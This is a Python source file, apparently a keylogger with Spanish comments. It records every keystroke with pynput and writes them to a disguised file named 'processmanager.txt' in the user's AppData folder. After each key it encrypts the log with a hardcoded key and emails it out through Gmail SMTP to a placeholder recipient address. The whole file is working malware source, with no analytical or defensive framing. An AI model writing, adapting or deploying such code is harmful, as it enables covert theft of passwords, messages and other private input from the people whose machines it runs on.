import os
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import smtplib

keys = []
count = 0
path = os.environ['appdata'] +'\\processmanager.txt'
#path = 'processmanager.txt'

def cifrar(texto, clave): return Fernet(clave).encrypt(texto)


def enviar_correo(sender, recipien, message):
    sender_email, sender_password = sender
    # Configuración del servidor SMTP de Gmail
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587  # Puerto de Gmail para TLS
    # Crear conexión segura con el servidor SMTP de Gmail
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    # Iniciar sesión en tu cuenta de Gmail
    server.login(sender_email, sender_password)
    # Enviar correo electrónico
    server.sendmail(sender_email, recipient, message)
    # Cerrar conexión con el servidor SMTP
    server.quit()


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    global sender, recipient, clave
    with open(path, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' caps_lock ')
            elif k.find('Key'):
                f.write(k)

    # Mandamos correo
    data = "\n".join(open(path,"r").readlines())
    enviar_correo(sender, recipient, cifrar(data.encode('utf-8'), clave))


if __name__=="__main__":
    sender = ['correo que lo envia', 'su contraseña']
    recipient = 'correo a donde se va a enviar'
    clave = b'W3NFJwDhdDLeE48araLk2P_kETmFjPhct-kif7QhgI4='
    with Listener(on_press=on_press) as listener:
        listener.join()
